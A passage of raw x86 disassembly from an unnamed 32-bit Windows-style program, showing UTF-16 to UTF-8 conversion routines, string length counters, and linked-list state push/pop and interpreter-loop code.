  401e37:	mov    DWORD PTR [ebp-0x14],0xd800
  401e3e:	mov    DWORD PTR [ebp-0x18],0xdc00
  401e45:	mov    DWORD PTR [ebp-0x1c],0xdfff
  401e4c:	mov    DWORD PTR [ebp-0x20],0x7ff
  401e53:	dec    ecx
  401e54:	mov    DWORD PTR [ebp-0x4],ecx
  401e57:	test   ebx,ebx
  401e59:	je     0x401e63
  401e5b:	cmp    eax,ebx
  401e5d:	jae    0x40207f
  401e63:	mov    ecx,DWORD PTR [ebp-0x8]
  401e66:	mov    DWORD PTR [ebp-0x10],0x0
  401e6d:	movzx  ecx,WORD PTR [ecx]
  401e70:	mov    DWORD PTR [ebp-0xc],ecx
  401e73:	cmp    cx,WORD PTR [ebp-0x14]
  401e77:	jb     0x401edd
  401e79:	mov    ecx,0xdbff
  401e7e:	cmp    WORD PTR [ebp-0xc],cx
  401e82:	mov    ecx,DWORD PTR [ebp-0x4]
  401e85:	ja     0x401edd
  401e87:	test   ebx,ebx
  401e89:	je     0x401ec9
  401e8b:	test   dx,dx
  401e8e:	je     0x401ed2
  401e90:	cmp    esi,ebx
  401e92:	jae    0x40209c
  401e98:	mov    ebx,DWORD PTR [ebp+0x8]
  401e9b:	mov    cx,dx
  401e9e:	shr    cx,0xc
  401ea2:	or     cl,0xe0
  401ea5:	mov    BYTE PTR [eax+ebx*1],cl
  401ea8:	mov    ecx,edx
  401eaa:	shr    ecx,0x6
  401ead:	and    cl,0x3f
  401eb0:	or     cl,0x80
  401eb3:	mov    BYTE PTR [eax+ebx*1+0x1],cl
  401eb7:	mov    ecx,ebx
  401eb9:	mov    ebx,DWORD PTR [ebp+0xc]
  401ebc:	and    dl,0x3f
  401ebf:	or     dl,0x80
  401ec2:	mov    BYTE PTR [eax+ecx*1+0x2],dl
  401ec6:	mov    ecx,DWORD PTR [ebp-0x4]
  401ec9:	add    eax,0x3
  401ecc:	add    edi,0x3
  401ecf:	add    esi,0x3
  401ed2:	mov    edx,DWORD PTR [ebp-0x8]
  401ed5:	movzx  edx,WORD PTR [edx]
  401ed8:	jmp    0x402072
  401edd:	test   dx,dx
  401ee0:	je     0x401fc0
  401ee6:	mov    ecx,DWORD PTR [ebp-0xc]
  401ee9:	cmp    cx,WORD PTR [ebp-0x18]
  401eed:	jb     0x401f6d
  401eef:	cmp    cx,WORD PTR [ebp-0x1c]
  401ef3:	ja     0x401f6d
  401ef5:	test   ebx,ebx
  401ef7:	je     0x401f63
  401ef9:	lea    ecx,[ebx-0x3]
  401efc:	cmp    eax,ecx
  401efe:	jae    0x402099
  401f04:	mov    ecx,DWORD PTR [ebp-0xc]
  401f07:	mov    ebx,DWORD PTR [ebp+0x8]
  401f0a:	movzx  ecx,cx
  401f0d:	movzx  edx,dx
  401f10:	sub    edx,0xd7f7
  401f16:	shl    edx,0xa
  401f19:	add    edx,ecx
  401f1b:	mov    ecx,edx
  401f1d:	shr    ecx,0x12
  401f20:	or     cl,0xf0
  401f23:	mov    BYTE PTR [eax+ebx*1],cl
  401f26:	mov    ecx,edx
  401f28:	shr    ecx,0xc
  401f2b:	and    cl,0x3f
  401f2e:	or     cl,0x80
  401f31:	mov    BYTE PTR [eax+ebx*1+0x1],cl
  401f35:	mov    ecx,edx
  401f37:	shr    ecx,0x6
  401f3a:	and    cl,0x3f
  401f3d:	or     cl,0x80
  401f40:	mov    BYTE PTR [eax+ebx*1+0x2],cl
  401f44:	and    dl,0x3f
  401f47:	mov    ecx,ebx
  401f49:	mov    ebx,DWORD PTR [ebp+0xc]
  401f4c:	or     dl,0x80
  401f4f:	mov    BYTE PTR [eax+ecx*1+0x3],dl
  401f53:	add    eax,0x4
  401f56:	add    edi,0x4
  401f59:	add    esi,0x4
  401f5c:	mov    ecx,0x1
  401f61:	jmp    0x401fb6
  401f63:	inc    eax
  401f64:	inc    edi
  401f65:	inc    esi
  401f66:	mov    ecx,0x1
  401f6b:	jmp    0x401fb6
  401f6d:	test   ebx,ebx
  401f6f:	je     0x401fb3
  401f71:	lea    ecx,[ebx-0x2]
  401f74:	cmp    eax,ecx
  401f76:	jae    0x402099
  401f7c:	mov    ebx,DWORD PTR [ebp+0x8]
  401f7f:	mov    cx,dx
  401f82:	shr    cx,0xc
  401f86:	or     cl,0xe0
  401f89:	mov    BYTE PTR [eax+ebx*1],cl
  401f8c:	mov    ecx,edx
  401f8e:	shr    ecx,0x6
  401f91:	and    cl,0x3f
  401f94:	or     cl,0x80
  401f97:	mov    BYTE PTR [eax+ebx*1+0x1],cl
  401f9b:	and    dl,0x3f
  401f9e:	mov    ecx,ebx
  401fa0:	mov    ebx,DWORD PTR [ebp+0xc]
  401fa3:	or     dl,0x80
  401fa6:	mov    BYTE PTR [eax+ecx*1+0x2],dl
  401faa:	add    eax,0x3
  401fad:	add    edi,0x3
  401fb0:	add    esi,0x3
  401fb3:	mov    ecx,DWORD PTR [ebp-0x10]
  401fb6:	xor    edx,edx
  401fb8:	test   ecx,ecx
  401fba:	jne    0x40206f
  401fc0:	mov    ecx,DWORD PTR [ebp-0x8]
  401fc3:	movzx  ecx,WORD PTR [ecx]
  401fc6:	cmp    ecx,0x7f
  401fc9:	ja     0x401fe5
  401fcb:	test   ebx,ebx
  401fcd:	je     0x401fdd
  401fcf:	mov    ecx,DWORD PTR [ebp-0x8]
  401fd2:	mov    ebx,DWORD PTR [ebp+0x8]
  401fd5:	mov    cl,BYTE PTR [ecx]
  401fd7:	mov    BYTE PTR [eax+ebx*1],cl
  401fda:	mov    ebx,DWORD PTR [ebp+0xc]
  401fdd:	inc    eax
  401fde:	inc    edi
  401fdf:	inc    esi
  401fe0:	jmp    0x40206f
  401fe5:	cmp    cx,WORD PTR [ebp-0x20]
  401fe9:	ja     0x40202b
  401feb:	test   ebx,ebx
  401fed:	je     0x402020
  401fef:	cmp    edi,ebx
  401ff1:	jae    0x402099
  401ff7:	mov    ebx,DWORD PTR [ebp+0x8]
  401ffa:	shr    ecx,0x6
  401ffd:	or     cl,0xc0
  402000:	mov    BYTE PTR [eax+ebx*1],cl
  402003:	mov    ecx,DWORD PTR [ebp-0x8]
  402006:	add    eax,0x2
  402009:	mov    cl,BYTE PTR [ecx]
  40200b:	and    cl,0x3f
  40200e:	or     cl,0x80
  402011:	mov    BYTE PTR [eax+ebx*1-0x1],cl
  402015:	mov    ebx,DWORD PTR [ebp+0xc]
  402018:	add    edi,0x2
  40201b:	add    esi,0x2
  40201e:	jmp    0x40206f
  402020:	add    eax,0x2
  402023:	add    edi,0x2
  402026:	add    esi,0x2
  402029:	jmp    0x40206f
  40202b:	test   ebx,ebx
  40202d:	je     0x402066
  40202f:	cmp    esi,ebx
  402031:	jae    0x402099
  402033:	mov    ebx,DWORD PTR [ebp+0x8]
  402036:	shr    cx,0xc
  40203a:	or     cl,0xe0
  40203d:	mov    BYTE PTR [eax+ebx*1],cl
  402040:	mov    ecx,DWORD PTR [ebp-0x8]
  402043:	mov    cx,WORD PTR [ecx]
  402046:	shr    cx,0x6
  40204a:	and    cl,0x3f
  40204d:	or     cl,0x80
  402050:	mov    BYTE PTR [eax+ebx*1+0x1],cl
  402054:	mov    ecx,DWORD PTR [ebp-0x8]
  402057:	mov    cl,BYTE PTR [ecx]
  402059:	and    cl,0x3f
  40205c:	or     cl,0x80
  40205f:	mov    BYTE PTR [eax+ebx*1+0x2],cl
  402063:	mov    ebx,DWORD PTR [ebp+0xc]
  402066:	add    eax,0x3
  402069:	add    edi,0x3
  40206c:	add    esi,0x3
  40206f:	mov    ecx,DWORD PTR [ebp-0x4]
  402072:	add    DWORD PTR [ebp-0x8],0x2
  402076:	test   ecx,ecx
  402078:	jne    0x401e53
  40207e:	dec    ecx
  40207f:	pop    edi
  402080:	pop    esi
  402081:	test   ebx,ebx
  402083:	pop    ebx
  402084:	je     0x402095
  402086:	cmp    ecx,0xffffffff
  402089:	je     0x402095
  40208b:	push   0x7a
  40208d:	call   DWORD PTR ds:0x4242b0
  402093:	xor    eax,eax
  402095:	mov    esp,ebp
  402097:	pop    ebp
  402098:	ret    
  402099:	mov    ecx,DWORD PTR [ebp-0x4]
  40209c:	inc    ecx
  40209d:	jmp    0x40207f
  40209f:	int3   
  4020a0:	push   ebp
  4020a1:	mov    ebp,esp
  4020a3:	push   ecx
  4020a4:	push   ebx
  4020a5:	mov    ebx,edx
  4020a7:	push   esi
  4020a8:	xor    edx,edx
  4020aa:	xor    esi,esi
  4020ac:	test   ebx,ebx
  4020ae:	je     0x402107
  4020b0:	push   edi
  4020b1:	mov    edi,DWORD PTR [ebp-0x4]
  4020b4:	mov    al,BYTE PTR [ecx]
  4020b6:	inc    ecx
  4020b7:	dec    ebx
  4020b8:	mov    DWORD PTR [ebp-0x4],ecx
  4020bb:	cmp    al,0x7f
  4020bd:	ja     0x4020c2
  4020bf:	inc    esi
  4020c0:	jmp    0x402102
  4020c2:	test   al,0x40
  4020c4:	jne    0x4020e9
  4020c6:	test   edx,edx
  4020c8:	je     0x4020bf
  4020ca:	movzx  eax,al
  4020cd:	and    eax,0x3f
  4020d0:	shl    edi,0x6
  4020d3:	or     edi,eax
  4020d5:	dec    edx
  4020d6:	jne    0x402102
  4020d8:	lea    eax,[edi-0x10000]
  4020de:	inc    esi
  4020df:	cmp    eax,0xfffff
  4020e4:	ja     0x402102
  4020e6:	inc    esi
  4020e7:	jmp    0x402102
  4020e9:	test   edx,edx
  4020eb:	je     0x4020ee
  4020ed:	inc    esi
  4020ee:	test   al,al
  4020f0:	jns    0x4020f7
  4020f2:	inc    edx
  4020f3:	add    al,al
  4020f5:	js     0x4020f2
  4020f7:	movzx  edi,al
  4020fa:	mov    cl,dl
  4020fc:	shr    edi,cl
  4020fe:	mov    ecx,DWORD PTR [ebp-0x4]
  402101:	dec    edx
  402102:	test   ebx,ebx
  402104:	jne    0x4020b4
  402106:	pop    edi
  402107:	mov    eax,esi
  402109:	pop    esi
  40210a:	pop    ebx
  40210b:	mov    esp,ebp
  40210d:	pop    ebp
  40210e:	ret    
  40210f:	int3   
  402110:	push   ebx
  402111:	push   esi
  402112:	mov    esi,ecx
  402114:	xor    eax,eax
  402116:	lea    ebx,[esi+edx*2]
  402119:	cmp    esi,ebx
  40211b:	jae    0x40218c
  40211d:	push   edi
  40211e:	mov    edi,edi
  402120:	movzx  edx,WORD PTR [esi]
  402123:	add    esi,0x2
  402126:	lea    ecx,[edx-0xd800]
  40212c:	cmp    ecx,0x3ff
  402132:	ja     0x402157
  402134:	cmp    esi,ebx
  402136:	jae    0x40218b
  402138:	movzx  edi,WORD PTR [esi]
  40213b:	lea    ecx,[edi-0xdc00]
  402141:	cmp    ecx,0x3ff
  402147:	ja     0x402172
  402149:	add    edx,0xffff2809
  40214f:	shl    edx,0xa
  402152:	add    edx,edi
  402154:	add    esi,0x2
  402157:	cmp    edx,0x80
  40215d:	jae    0x402162
  40215f:	inc    eax
  402160:	jmp    0x402187
  402162:	cmp    edx,0x800
  402168:	jb     0x402184
  40216a:	cmp    edx,0x10000
  402170:	jae    0x402177
  402172:	add    eax,0x3
  402175:	jmp    0x402187
  402177:	cmp    edx,0x10ffff
  40217d:	ja     0x402184
  40217f:	add    eax,0x4
  402182:	jmp    0x402187
  402184:	add    eax,0x2
  402187:	cmp    esi,ebx
  402189:	jb     0x402120
  40218b:	pop    edi
  40218c:	pop    esi
  40218d:	pop    ebx
  40218e:	ret    
  40218f:	int3   
  402190:	push   ecx
  402191:	mov    edx,DWORD PTR ds:0x40e644
  402197:	push   0x0
  402199:	mov    ecx,0x5e1
  40219e:	call   0x407010
  4021a3:	int3   
  4021a4:	int3   
  4021a5:	int3   
  4021a6:	int3   
  4021a7:	int3   
  4021a8:	int3   
  4021a9:	int3   
  4021aa:	int3   
  4021ab:	int3   
  4021ac:	int3   
  4021ad:	int3   
  4021ae:	int3   
  4021af:	int3   
  4021b0:	push   ecx
  4021b1:	mov    edx,DWORD PTR ds:0x40e644
  4021b7:	push   0x0
  4021b9:	mov    ecx,0x5df
  4021be:	call   0x407010
  4021c3:	int3   
  4021c4:	int3   
  4021c5:	int3   
  4021c6:	int3   
  4021c7:	int3   
  4021c8:	int3   
  4021c9:	int3   
  4021ca:	int3   
  4021cb:	int3   
  4021cc:	int3   
  4021cd:	int3   
  4021ce:	int3   
  4021cf:	int3   
  4021d0:	push   ebp
  4021d1:	mov    ebp,esp
  4021d3:	mov    ax,WORD PTR [ebp+0x8]
  4021d7:	pop    ebp
  4021d8:	ret    
  4021d9:	int3   
  4021da:	int3   
  4021db:	int3   
  4021dc:	int3   
  4021dd:	int3   
  4021de:	int3   
  4021df:	int3   
  4021e0:	push   ebp
  4021e1:	mov    ebp,esp
  4021e3:	mov    eax,DWORD PTR [ebp+0x8]
  4021e6:	shr    eax,0x2
  4021e9:	pop    ebp
  4021ea:	ret    
  4021eb:	int3   
  4021ec:	int3   
  4021ed:	int3   
  4021ee:	int3   
  4021ef:	int3   
  4021f0:	push   ecx
  4021f1:	push   0x1
  4021f3:	push   0xb
  4021f5:	call   DWORD PTR ds:0x424424
  4021fb:	mov    edx,eax
  4021fd:	add    esp,0x8
  402200:	test   edx,edx
  402202:	je     0x402231
  402204:	mov    ax,ds:0x414b10
  40220a:	mov    ecx,DWORD PTR ds:0x40e420
  402210:	mov    WORD PTR [edx+0x8],ax
  402214:	mov    al,ds:0x40e411
  402219:	mov    BYTE PTR [edx+0xa],al
  40221c:	mov    eax,ds:0x414b00
  402221:	mov    DWORD PTR [edx+0x4],ecx
  402224:	mov    DWORD PTR [edx],eax
  402226:	inc    DWORD PTR [ecx+0x12]
  402229:	mov    DWORD PTR ds:0x414b00,edx
  40222f:	pop    ecx
  402230:	ret    
  402231:	push   0x0
  402233:	mov    edx,0x4010c0
  402238:	mov    ecx,0x5e5
  40223d:	call   0x407010
  402242:	int3   
  402243:	int3   
  402244:	int3   
  402245:	int3   
  402246:	int3   
  402247:	int3   
  402248:	int3   
  402249:	int3   
  40224a:	int3   
  40224b:	int3   
  40224c:	int3   
  40224d:	int3   
  40224e:	int3   
  40224f:	int3   
  402250:	push   ecx
  402251:	push   0x1
  402253:	push   0xc
  402255:	call   DWORD PTR ds:0x424424
  40225b:	mov    ecx,eax
  40225d:	add    esp,0x8
  402260:	test   ecx,ecx
  402262:	je     0x40228b
  402264:	mov    eax,ds:0x414b08
  402269:	mov    edx,DWORD PTR ds:0x414b0c
  40226f:	mov    DWORD PTR [ecx+0x4],eax
  402272:	mov    eax,ds:0x414b04
  402277:	mov    DWORD PTR [ecx+0x8],edx
  40227a:	mov    DWORD PTR [ecx],eax
  40227c:	mov    DWORD PTR ds:0x414b04,ecx
  402282:	test   edx,edx
  402284:	je     0x402289
  402286:	inc    DWORD PTR [edx+0x16]
  402289:	pop    ecx
  40228a:	ret    
  40228b:	push   0x0
  40228d:	mov    edx,0x4010c0
  402292:	mov    ecx,0x5e5
  402297:	call   0x407010
  40229c:	int3   
  40229d:	int3   
  40229e:	int3   
  40229f:	int3   
  4022a0:	push   ecx
  4022a1:	mov    edx,DWORD PTR ds:0x414b00
  4022a7:	test   edx,edx
  4022a9:	jne    0x4022bd
  4022ab:	mov    edx,DWORD PTR ds:0x40e8dc
  4022b1:	mov    ecx,0x1197
  4022b6:	call   0x4071e0
  4022bb:	pop    ecx
  4022bc:	ret    
  4022bd:	mov    ecx,DWORD PTR ds:0x40e420
  4022c3:	cmp    BYTE PTR [ecx+0xc],0x0
  4022c7:	jne    0x4022f0
  4022c9:	cmp    DWORD PTR [ecx+0x12],0x0
  4022cd:	jne    0x4022f0
  4022cf:	cmp    WORD PTR [ecx+0x10],0x1
  4022d4:	jne    0x4022f0
  4022d6:	cmp    DWORD PTR [ecx+0x16],0x0
  4022da:	jne    0x4022f0
  4022dc:	mov    eax,0x2
  4022e1:	mov    WORD PTR [ecx+0x10],ax
  4022e5:	call   0x4039b0
  4022ea:	mov    edx,DWORD PTR ds:0x414b00
  4022f0:	mov    al,BYTE PTR [edx+0xa]
  4022f3:	mov    ecx,DWORD PTR [edx+0x4]
  4022f6:	mov    ds:0x40e411,al
  4022fb:	mov    ax,WORD PTR [edx+0x8]
  4022ff:	mov    ds:0x414b10,ax
  402305:	mov    eax,DWORD PTR [edx]
  402307:	dec    DWORD PTR [ecx+0x12]
  40230a:	push   edx
  40230b:	mov    DWORD PTR ds:0x40e420,ecx
  402311:	mov    ds:0x414b00,eax
  402316:	call   DWORD PTR ds:0x42441c
  40231c:	add    esp,0x4
  40231f:	pop    ecx
  402320:	ret    
  402321:	int3   
  402322:	int3   
  402323:	int3   
  402324:	int3   
  402325:	int3   
  402326:	int3   
  402327:	int3   
  402328:	int3   
  402329:	int3   
  40232a:	int3   
  40232b:	int3   
  40232c:	int3   
  40232d:	int3   
  40232e:	int3   
  40232f:	int3   
  402330:	mov    ecx,DWORD PTR ds:0x414b04
  402336:	push   esi
  402337:	test   ecx,ecx
  402339:	jne    0x40234c
  40233b:	mov    edx,DWORD PTR ds:0x40e8dc
  402341:	mov    ecx,0x1197
  402346:	pop    esi
  402347:	jmp    0x4071e0
  40234c:	mov    eax,DWORD PTR [ecx+0x4]
  40234f:	mov    ds:0x414b08,eax
  402354:	mov    eax,DWORD PTR [ecx+0x8]
  402357:	mov    ds:0x414b0c,eax
  40235c:	mov    DWORD PTR ds:0x414b18,0xffffffff
  402366:	call   0x403340
  40236b:	mov    esi,DWORD PTR ds:0x414b04
  402371:	mov    eax,DWORD PTR [esi]
  402373:	mov    ds:0x414b04,eax
  402378:	mov    eax,ds:0x414b0c
  40237d:	test   eax,eax
  40237f:	je     0x402384
  402381:	dec    DWORD PTR [eax+0x16]
  402384:	mov    ecx,DWORD PTR ds:0x414b08
  40238a:	test   ecx,ecx
  40238c:	je     0x4023ad
  40238e:	cmp    eax,DWORD PTR ds:0x40e420
  402394:	je     0x4023ad
  402396:	mov    ecx,DWORD PTR [ecx+0x2]
  402399:	call   0x403430
  40239e:	mov    ds:0x414b08,eax
  4023a3:	mov    eax,ds:0x40e420
  4023a8:	mov    ds:0x414b0c,eax
  4023ad:	push   esi
  4023ae:	call   DWORD PTR ds:0x42441c
  4023b4:	add    esp,0x4
  4023b7:	pop    esi
  4023b8:	ret    
  4023b9:	int3   
  4023ba:	int3   
  4023bb:	int3   
  4023bc:	int3   
  4023bd:	int3   
  4023be:	int3   
  4023bf:	int3   
  4023c0:	cmp    DWORD PTR ds:0x414b00,0x0
  4023c7:	push   ebx
  4023c8:	mov    ebx,DWORD PTR ds:0x42441c
  4023ce:	push   esi
  4023cf:	push   edi
  4023d0:	je     0x402462
  4023d6:	mov    edx,DWORD PTR ds:0x40e8dc
  4023dc:	mov    ecx,0x1197
  4023e1:	call   0x4071e0
  4023e6:	mov    edi,DWORD PTR ds:0x414b00
  4023ec:	test   edi,edi
  4023ee:	je     0x40245a
  4023f0:	mov    esi,DWORD PTR ds:0x40e420
  4023f6:	mov    eax,0x2
  4023fb:	cmp    BYTE PTR [esi+0xc],0x0
  4023ff:	jne    0x402425
  402401:	cmp    DWORD PTR [esi+0x12],0x0
  402405:	jne    0x402425
  402407:	cmp    WORD PTR [esi+0x10],0x1
  40240c:	jne    0x402425
  40240e:	cmp    DWORD PTR [esi+0x16],0x0
  402412:	jne    0x402425
  402414:	mov    ecx,esi
  402416:	mov    WORD PTR [esi+0x10],ax
  40241a:	call   0x4039b0
  40241f:	mov    edi,DWORD PTR ds:0x414b00
  402425:	mov    al,BYTE PTR [edi+0xa]
  402428:	mov    esi,DWORD PTR [edi+0x4]
  40242b:	mov    ds:0x40e411,al
  402430:	mov    ax,WORD PTR [edi+0x8]
  402434:	push   edi
  402435:	mov    edi,DWORD PTR [edi]
  402437:	dec    DWORD PTR [esi+0x12]
  40243a:	mov    DWORD PTR ds:0x40e420,esi
  402440:	mov    ds:0x414b10,ax
  402446:	mov    DWORD PTR ds:0x414b00,edi
  40244c:	call   ebx
  40244e:	add    esp,0x4
  402451:	mov    eax,0x2
  402456:	test   edi,edi
  402458:	jne    0x4023fb
  40245a:	xor    eax,eax
  40245c:	mov    ds:0x40e424,ax
  402462:	cmp    DWORD PTR ds:0x414b04,0x0
  402469:	je     0x4024fb
  40246f:	mov    edx,DWORD PTR ds:0x40e8dc
  402475:	mov    ecx,0x1197
  40247a:	call   0x4071e0
  40247f:	mov    esi,DWORD PTR ds:0x414b04
  402485:	test   esi,esi
  402487:	je     0x4024fb
  402489:	mov    eax,DWORD PTR [esi+0x4]
  40248c:	mov    ds:0x414b08,eax
  402491:	mov    eax,DWORD PTR [esi+0x8]
  402494:	mov    ds:0x414b0c,eax
  402499:	mov    DWORD PTR ds:0x414b18,0xffffffff
  4024a3:	call   0x403340
  4024a8:	mov    edi,DWORD PTR ds:0x414b04
  4024ae:	mov    eax,ds:0x414b0c
  4024b3:	mov    esi,DWORD PTR [edi]
  4024b5:	mov    DWORD PTR ds:0x414b04,esi
  4024bb:	test   eax,eax
  4024bd:	je     0x4024c2
  4024bf:	dec    DWORD PTR [eax+0x16]
  4024c2:	mov    ecx,DWORD PTR ds:0x414b08
  4024c8:	test   ecx,ecx
  4024ca:	je     0x4024f1
  4024cc:	cmp    eax,DWORD PTR ds:0x40e420
  4024d2:	je     0x4024f1
  4024d4:	mov    ecx,DWORD PTR [ecx+0x2]
  4024d7:	call   0x403430
  4024dc:	mov    esi,DWORD PTR ds:0x414b04
  4024e2:	mov    ds:0x414b08,eax
  4024e7:	mov    eax,ds:0x40e420
  4024ec:	mov    ds:0x414b0c,eax
  4024f1:	push   edi
  4024f2:	call   ebx
  4024f4:	add    esp,0x4
  4024f7:	test   esi,esi
  4024f9:	jne    0x402489
  4024fb:	pop    edi
  4024fc:	pop    esi
  4024fd:	pop    ebx
  4024fe:	ret    
  4024ff:	int3   
  402500:	push   ebp
  402501:	mov    ebp,esp
  402503:	mov    ecx,DWORD PTR ds:0x40e8d4
  402509:	sub    esp,0x8
  40250c:	movzx  eax,WORD PTR [ecx]
  40250f:	push   esi
  402510:	push   edi
  402511:	test   ax,ax
  402514:	je     0x40258f
  402516:	cmp    BYTE PTR ds:0x40e640,0x0
  40251d:	je     0x40254d
  40251f:	cmp    BYTE PTR ds:0x40e028,0x0
  402526:	jne    0x40254d
  402528:	cmp    eax,0x2f
  40252b:	je     0x40258f
  40252d:	cmp    eax,0x5c
  402530:	je     0x40258f
  402532:	movzx  eax,WORD PTR [ecx+0x2]
  402536:	cmp    eax,0x3a
  402539:	jne    0x40254d
  40253b:	cmp    WORD PTR [ecx+0x4],0x2f
  402540:	je     0x40258f
  402542:	cmp    eax,eax
  402544:	jne    0x40254d
  402546:	cmp    WORD PTR [ecx+0x4],0x5c
  40254b:	je     0x40258f
  40254d:	mov    esi,DWORD PTR ds:0x40e434
  402553:	test   esi,esi
  402555:	je     0x402587
  402557:	mov    edx,0x40e8e0
  40255c:	call   0x409e70
  402561:	mov    edi,eax
  402563:	mov    ecx,DWORD PTR [esi+0x4]
  402566:	mov    edx,edi
  402568:	call   0x40a490
  40256d:	test   al,al
  40256f:	jne    0x40257d
  402571:	mov    esi,DWORD PTR [esi]
  402573:	test   esi,esi
  402575:	jne    0x402563
  402577:	pop    edi
  402578:	pop    esi
  402579:	mov    esp,ebp
  40257b:	pop    ebp
  40257c:	ret    
  40257d:	cmp    BYTE PTR [esi+0x8],0x0
  402581:	je     0x40258f
  402583:	mov    BYTE PTR [esi+0x8],0x0
  402587:	xor    al,al
  402589:	pop    edi
  40258a:	pop    esi
  40258b:	mov    esp,ebp
  40258d:	pop    ebp
  40258e:	ret    
  40258f:	pop    edi
  402590:	mov    al,0x1
  402592:	pop    esi
  402593:	mov    esp,ebp
  402595:	pop    ebp
  402596:	ret    
  402597:	int3   
  402598:	int3   
  402599:	int3   
  40259a:	int3   
  40259b:	int3   
  40259c:	int3   
  40259d:	int3   
  40259e:	int3   
  40259f:	int3   
  4025a0:	cmp    BYTE PTR ds:0x40e42b,0x0
  4025a7:	je     0x4025bd
  4025a9:	mov    al,ds:0x40e8cd
  4025ae:	cmp    al,0x8
  4025b0:	je     0x4025bd
  4025b2:	cmp    al,0x9
  4025b4:	je     0x4025bd
  4025b6:	cmp    al,0x7
  4025b8:	je     0x4025bd
  4025ba:	mov    al,0x1
  4025bc:	ret    
  4025bd:	xor    al,al
  4025bf:	ret    
  4025c0:	push   esi
  4025c1:	mov    esi,ecx
  4025c3:	mov    ecx,0x1000
  4025c8:	mov    DWORD PTR [esi+0x22],0x0
  4025cf:	mov    DWORD PTR [esi+0x2a],0x4021e0
  4025d6:	mov    DWORD PTR [esi+0x26],0x400
  4025dd:	mov    DWORD PTR [esi+0x1e],0x0
  4025e4:	call   0x40cef0
  4025e9:	mov    DWORD PTR [esi+0x1e],eax
  4025ec:	xor    eax,eax
  4025ee:	mov    DWORD PTR [esi+0x4],eax
  4025f1:	mov    DWORD PTR [esi+0x8],eax
  4025f4:	mov    WORD PTR [esi+0xc],ax
  4025f8:	mov    eax,0xffff
  4025fd:	mov    WORD PTR [esi+0x1c],ax
  402601:	mov    DWORD PTR [esi],0x0
  402607:	mov    DWORD PTR [esi+0xe],0x100
  40260e:	mov    DWORD PTR [esi+0x12],0x0
  402615:	mov    DWORD PTR [esi+0x16],0x0
  40261c:	mov    eax,esi
  40261e:	pop    esi
  40261f:	ret    
  402620:	push   ebp
  402621:	mov    ebp,esp
  402623:	and    esp,0xfffffff8
  402626:	sub    esp,0x14
  402629:	mov    ecx,DWORD PTR ds:0x40e418
  40262f:	push   ebx
  402630:	push   esi
  402631:	xor    esi,esi
  402633:	push   edi
  402634:	mov    DWORD PTR [esp+0x1c],esi
  402638:	test   ecx,ecx
  40263a:	je     0x402643
  40263c:	call   0x4069a0
  402641:	jmp    0x40268a
  402643:	push   0x10
  402645:	push   0x0
  402647:	push   DWORD PTR ds:0x40e648
  40264d:	call   DWORD PTR ds:0x4242c4
  402653:	mov    esi,eax
  402655:	test   esi,esi
  402657:	je     0x402dfb
  40265d:	mov    ecx,0x8000
  402662:	mov    DWORD PTR [esi+0x4],0x0
  402669:	mov    DWORD PTR [esi+0xc],0x4021d0
  402670:	mov    DWORD PTR [esi+0x8],0x2000
  402677:	mov    DWORD PTR [esi],0x0
  40267d:	call   0x40cd70
  402682:	mov    DWORD PTR [esi],eax
  402684:	mov    DWORD PTR ds:0x40e418,esi
  40268a:	xor    eax,eax
  40268c:	mov    edi,0xffff
  402691:	mov    BYTE PTR ds:0x40e410,0x0
  402698:	mov    WORD PTR ds:0x40e8d8,di
  40269f:	mov    ds:0x40eaf8,ax
  4026a5:	lea    ebx,[eax+0x1]
  4026a8:	cmp    DWORD PTR ds:0x40e41c,eax
  4026ae:	jne    0x4026c9
  4026b0:	mov    ecx,0x4010c4
  4026b5:	call   0x40b440
  4026ba:	mov    ds:0x40e41c,eax
  4026bf:	mov    WORD PTR [eax+0xc],0x101
  4026c5:	mov    WORD PTR [eax+0x10],bx
  4026c9:	mov    ebx,DWORD PTR ds:0x41f368
  4026cf:	mov    esi,DWORD PTR ds:0x40e8dc
  4026d5:	mov    DWORD PTR [esp+0x10],ebx
  4026d9:	test   ebx,ebx
  4026db:	je     0x402db3
  4026e1:	lea    eax,[ebx+0xc]
  4026e4:	push   esi
  4026e5:	push   eax
  4026e6:	call   DWORD PTR ds:0x4244bc
  4026ec:	add    esp,0x8
  4026ef:	test   eax,eax
  4026f1:	je     0x402703
  4026f3:	mov    ebx,DWORD PTR [ebx+0x4]
  4026f6:	mov    DWORD PTR [esp+0x10],ebx
  4026fa:	test   ebx,ebx
  4026fc:	jne    0x4026e1
  4026fe:	jmp    0x402db3
  402703:	test   ebx,ebx
  402705:	je     0x402db3
  40270b:	mov    ax,WORD PTR [ebx+0x2]
  40270f:	add    ebx,0x8
  402712:	mov    ds:0x414b14,ax
  402718:	mov    eax,DWORD PTR [ebx]
  40271a:	mov    WORD PTR ds:0x414b10,di
  402721:	mov    DWORD PTR [esp+0xc],ebx
  402725:	test   eax,eax
  402727:	je     0x40272d
  402729:	mov    esi,DWORD PTR [eax]
  40272b:	jmp    0x40272f
  40272d:	xor    esi,esi
  40272f:	push   esi
  402730:	push   0x4
  402732:	mov    DWORD PTR [esp+0x1c],esi
  402736:	call   DWORD PTR ds:0x424424
  40273c:	mov    ecx,eax
  40273e:	add    esp,0x8
  402741:	mov    DWORD PTR [esp+0x18],ecx
  402745:	test   ecx,ecx
  402747:	je     0x402dc1
  40274d:	lea    eax,[esi*4+0x0]
  402754:	push   eax
  402755:	mov    eax,DWORD PTR [ebx]
  402757:	add    eax,0x4
  40275a:	push   eax
  40275b:	push   ecx
  40275c:	call   0x40db6c
  402761:	add    esp,0xc
  402764:	mov    ecx,ebx
  402766:	call   0x406050
  40276b:	mov    eax,ds:0x40e41c
  402770:	mov    BYTE PTR ds:0x40e411,0x1
  402777:	mov    BYTE PTR ds:0x40e028,0x1
  40277e:	mov    ds:0x40e420,eax
  402783:	call   0x40a7f0
  402788:	mov    esi,DWORD PTR ds:0x40e420
  40278e:	mov    edi,DWORD PTR ds:0x414b08
  402794:	cmp    al,0xff
  402796:	sete   bl
  402799:	lea    esp,[esp+0x0]
  4027a0:	cmp    BYTE PTR ds:0x40e42a,0x0
  4027a7:	jne    0x402df6
  4027ad:	test   bl,bl
  4027af:	jne    0x402d21
  4027b5:	mov    dx,WORD PTR ds:0x40e428
  4027bc:	test   dx,dx
  4027bf:	je     0x4027ca
  4027c1:	call   0x4025a0
  4027c6:	test   al,al
  4027c8:	jne    0x402783
  4027ca:	cmp    BYTE PTR ds:0x40e411,0x0
  4027d1:	mov    cl,BYTE PTR ds:0x40e8cd
  4027d7:	je     0x4027f4
  4027d9:	movzx  eax,cl
  4027dc:	dec    eax
  4027dd:	cmp    eax,0x19
